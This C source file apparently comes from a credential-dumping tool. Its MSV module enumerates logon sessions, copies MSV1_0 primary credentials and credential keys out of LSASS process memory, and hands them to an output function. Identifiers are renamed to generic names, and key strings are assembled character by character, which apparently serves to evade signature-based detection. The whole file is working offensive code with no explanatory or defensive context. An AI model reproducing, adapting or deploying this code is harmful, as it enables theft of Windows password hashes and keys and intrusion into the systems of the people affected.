#include "my_modules_hash.h"


MY_M_MODULES_PACKAGE my_m_modules_msv_package = { my_m_modules_enum_logon_callback_msv, TRUE, (wchar_t*)(L"waitforinit"), {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE}};



const PMY_M_MODULES_PACKAGE my_m_modules_msv_single_package[] = {&my_m_modules_msv_package};

void CALLBACK my_m_modules_enum_logon_callback_msv(IN PMPW_BASIC_SECURITY_LOGON_SESSION_DATA pData)
{
	my_m_modules_msv_enum_cred(pData->cLs, pData->pCredentials, my_m_modules_msv_enum_cred_callback_std, pData);
}

BOOL CALLBACK my_m_modules_msv_enum_cred_callback_std(IN PMY_M_MODULES_CONTEXT cLs, IN PMPW_MSV1_0_PRIMARY_CREDENTIALS pCredentials, IN DWORD AuthenticationPackageId, IN PPW_M_MEMORY_ADDRESS origBufferAddress, IN OPTIONAL LPVOID pOptionalData)
{
    char szPrimary[] = { 'P','r','i','m','a','r','y','\0' };
    char szCredentialKeys[] = { 'C','r','e','d','e','n','t','i','a','l','K','e','y','s','\0' };
    const ANSI_STRING PRIMARY_STRING = { 7, 8, szPrimary };
    const ANSI_STRING	CREDENTIALKEYS_STRING = { 14, 15, szCredentialKeys };


	DWORD flags = MY_MODULES_CREDS_DISPLAY_CREDENTIAL;
	if(MRtlEqualString(&pCredentials->Primary, &PRIMARY_STRING, FALSE))
		flags |= MY_MODULES_CREDS_DISPLAY_PRIMARY;
	else if(MRtlEqualString(&pCredentials->Primary, &CREDENTIALKEYS_STRING, FALSE))
		flags |= MY_MODULES_CREDS_DISPLAY_CREDENTIALKEY;
	my_m_modules_genericCredsOutput((PMPW_GENERIC_PRIMARY_CREDENTIAL) &pCredentials->Credentials, (PMPW_BASIC_SECURITY_LOGON_SESSION_DATA) pOptionalData, flags);
	return TRUE;
}

VOID my_m_modules_msv_enum_cred(IN PMY_M_MODULES_CONTEXT cLs, IN PVOID pCredentials, IN PMY_M_MODULES_MSV_CRED_CALLBACK credCallback, IN PVOID optionalData)
{
	MPW_MSV1_0_CREDENTIALS credentials;
	MPW_MSV1_0_PRIMARY_CREDENTIALS primaryCredentials;
	PW_M_MEMORY_ADDRESS aLocalMemory = {NULL, &PW_M_MEMORY_GLOBAL_OWN_HANDLE}, aLsMemory = {pCredentials, cLs->hLsMem};

	while(aLsMemory.address)
	{
		aLocalMemory.address = &credentials;
		if(pw_m_memory_copy(&aLocalMemory, &aLsMemory, sizeof(MPW_MSV1_0_CREDENTIALS)))
		{
			aLsMemory.address = credentials.PrimaryCredentials;
			while(aLsMemory.address)
			{
				aLocalMemory.address = &primaryCredentials;
				if(pw_m_memory_copy(&aLocalMemory, &aLsMemory, sizeof(MPW_MSV1_0_PRIMARY_CREDENTIALS)))
				{
					aLsMemory.address = primaryCredentials.Credentials.Buffer;
					if(pw_m_process_getUnicodeString(&primaryCredentials.Credentials, cLs->hLsMem))
					{
						if(pw_m_process_getUnicodeString((PUNICODE_STRING) &primaryCredentials.Primary, cLs->hLsMem))
						{
							credCallback(cLs, &primaryCredentials, credentials.AuthenticationPackageId, &aLsMemory, optionalData);
							LocalFree(primaryCredentials.Primary.Buffer);
						}
						LocalFree(primaryCredentials.Credentials.Buffer);
					}
				}
				aLsMemory.address = primaryCredentials.next;
			}
			aLsMemory.address = credentials.next;
		}
	}
}
